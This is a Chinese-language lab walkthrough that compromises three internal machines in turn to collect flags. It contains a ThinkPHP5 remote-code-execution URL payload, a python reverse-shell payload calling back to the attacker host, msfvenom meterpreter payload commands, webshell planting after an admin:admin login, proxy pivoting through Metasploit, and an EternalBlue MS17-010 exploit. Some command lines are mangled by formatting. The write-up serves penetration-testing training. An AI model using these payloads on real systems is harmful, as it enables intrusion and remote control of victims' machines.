## 环境介绍

现在有三台机器，分别为target1，target2，target3，里面分别有三个flag，每个flag的分值不同，需要通过拿下一个已知IP（target1）进而向内网里面进行渗透，最终要成功获得三台主机权限

## 渗透过程

### target1

使用nmap进行扫描![](../Images/2414d2210436d52518f09efe2af92af8.png)可以看到开启了80端口 浏览器访问目标靶机80端口![](../Images/f03dd5bd3c08a393cb56b29a2c75feb8.png)可以看到就是apache的默认页面 使用dirb进行目录结构扫描![](../Images/a34f0cbbe6fec9392737506ffc19ede6.png)发现`public`页面![](../Images/43acd18c6973ebc51d91c01c184488a9.png)可以看到是thinkphp5搭建的网站，thinkphp5曾经爆过一个远程代码执行的漏洞，直接上网站寻找payload验证是否存在漏洞

```
http://192.168.109.181/public/?s=index/\think\app/invokefunction&function
=call_user_func_array&vars[0]=system&vars[1][]=id
```

![](../Images/a520f1eae4028b9bb3afa8d9c282a928.png)可以看到确实存在漏洞，现在可以向网站里面写入一句话木马，然后用蚁剑去连接，这是一种方法，但是也可以直接去尝试反弹一个shell到kali上

```

kali上执行：nc -lvvp 4444function
=call_user_func_array&vars[0]=system&vars[1][]=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.109.128%22,4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);
```

可以看到kali这边成功反弹到了一个shell![](../Images/a1be72d83443609ce14441f6af5f8d77.png)使用python生成一个交互式的shell![](../Images/386cd9f96266faffc2154c8c431b0320.png)查找一下flag![](../Images/a0702f39ce14ab9a1721bc7f66d01dbf.png)成功获得第一个flag 使用msfvenom生成一个反向的shellcode

```

msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.109.128 lport=5555 -f elf > msf.elf
```

![](../Images/14fd8ed8422b69cd1c605fcb2bed71c6.png)使用python开启一个临时http服务![](../Images/186d20d160a5597e47a42c11b3d7e0fc.png)靶机下载该shellcode![](../Images/65e0fe97733156f05ed698ef78b9c617.png)然后kali打开msf，进行监听

```

use exploit/multi/handlerset
 payload linux/x64/meterpreter/reverse_tcpset
 lport 5555set

 lhost 192.168.109.128
```

![](../Images/8d05f38cd10e21e07732615a19a71cd7.png)然后靶机上给予shellcode执行的权限后执行该文件![](../Images/f90f9912487cf0d673a59b34f7f001ec.png)可以看到kali这边成功返回一个meterpreter![](../Images/184e4fa7e18b13abfcfda82377bdfa9b.png)查看一下网络配置![](../Images/f5e7a63e81e5fd551fb0dd17bd2d11b5.png)可以看到target1还存在一个网段 添加路由表![](../Images/c965831df26daeeb619892cb55f965c3.png)配置socks代理

```


use auxiliary/server/socks_proxy
```

![](../Images/5b57ccf8975b1bc819dd14f1324db137.png)配置proxychains代理链

```

vim /etc/proxychains4.conf
```

![](../Images/028a2b636d9059b9e963729ffbe1e26a.png)

### target2

扫描10.1.1.0/24这个网段是否还存在其他机器

```

use auxiliary/scanner/portscan/tcpset
 rhosts 10.1.1.0/24set
 ports 1-1000set

 threads 50
```

![](../Images/fcfe77aa951f19d25a5514bbcfaafe10.png)可以看到该网段还存在一台机器为10.1.1.150 使用nmap扫描10.1.1.150开放端口

```

proxychains4 nmap -Pn -sT 10.1.1.150
```

![](../Images/dd47ef3c5c240d4905a3475277734e27.png)可以看到也开放了80端口 这里直接用浏览器去访问10.1.1.150的80端口显然是不行的，不过火狐浏览器也是支持socks代理的![](../Images/0301eda5c639d04e09bbc52364d9993d.png)再次访问网站![](../Images/c6cf15ab8d5a3526945c60a8868e7732.png)查看`robots.txt`文件![](../Images/554bb95134810aef34089c1973e11d4d.png)找到后台登入位置![](../Images/7b54c1f9eb486edea4fcb25a7791a6bb.png)直接使用弱密码`admin:admin`登入成功![](../Images/a206c33e4c819f8eee533918925f9706.png)成功获得第二个flag，找到模板位置，发现里面的源码都是可以编辑的![](../Images/b87651d05eed10534494e8d10a61f555.png)写入一句话木马![](../Images/6d89434d037b5b3964f81e5f92454ba5.png)然后使用蚁剑去连接，当然直接去连接肯定也是不行的，不过蚁剑也是支持代理设置的![](../Images/0fed47316aacc9c0bd773624f49d5d3f.png)之后再正常去连接就行了，但是我这里不知道是环境问题还是蚁剑的问题，正常来说这里是肯定能连接成功的，我试了很多遍都没有成功，然后想着直接把那个页面里面的源码直接换为大马，也是不行的，因为一般大马都是经过作者编译过了，直接复制过去肯定会有问题，最后只能直接将大马事先准备在了网站根目录下面，这里主要是为了体现内网渗透，所以这里也不细说 访问大马![](../Images/c2d0dcfeb322d665386189613d579745.png)使用msfvenom生成一个正向连接的shellcode

```

msfvenom -p windows/meterpreter/bind_tcp lport=6666 -f exe -o 1.exe
```

![](../Images/4bce32ffd0768eabe3be9eb7039c9410.png)然后通过大马将shellcode上传到目标服务器![](../Images/6185bf28fa3757324189db6daa84da0f.png)然后再次进入之前打开的msf

```

use exploit/multi/handlerset
 payload windows/meterpreter/bind_tcpset
 lport 6666set

 rhost 10.1.1.150
```

![](../Images/682b8269595d48beaf926e9c62f32379.png)然后在大马上执行上传的shellcode![](../Images/2c8015aee1ff033f768563cbee0b6b47.png)可以看到kali这边成功返回了一个meterpreter![](../Images/ca73e70bb3db9b9a7e4ef641464493ba.png)查看网络配置![](../Images/5198f6e667397aafb35706d1bb775917.png)可以看到还有一个网段10.1.2.0/24 将路由添加到路由表

```

run post/multi/manage/autoroute
```

![](../Images/fa5d5deb3e1d476d2b88bd82272093be.png)

### taget3

扫描10.1.2.0/24网段是否还存在其他机器

```

use auxiliary/scanner/portscan/tcpset
 rhosts 10.1.2.0/24set
 ports 1-1000set

 threads 100
```

![](../Images/8f8d2c2f968f0ae32e8df89914747ff8.png)这里扫描实在太慢，这个网段还有一个机器IP为10.1.2.250 然后再添加一层socks代理

```

use auxiliary/server/socks_proxyset

 srvport 2222
```

![](../Images/ef587212453705b68625c251cf8912e6.png)配置proxychains代理链

```

vim /etc/proxychains4.conf
```

![](../Images/3d92a8845a29fee0efaa67858b993c68.png)使用nmap进行端口扫描

```

proxychains4 nmap -Pn -sT 10.1.2.250
```

![](../Images/6962392a39b14acf1bce4591dd397f8a.png)根据扫描结果判断操作系统为windows 再使用nmap的漏扫脚本进行扫描

```

proxychains4 nmap --script=vuln 10.1.2.250
```

![](../Images/eae15e347b333d99626826620f2c545a.png)可以看到存在ms17-010，直接上msf寻找攻击模块

```

use exploit/windows/smb/ms17_010_eternalblueset
 payload windows/x64/meterpreter/bind_tcpset

 rhost 10.1.2.250
```

![](../Images/e8e5c86a49993a1efaaf2ba60393d6dc.png)查找一下flag![](../Images/4db66cdff5eaa96eecf0cd949f8ba6dd.png)三台主机的权限全部那先，所有flag查找完毕，至此，渗透结束
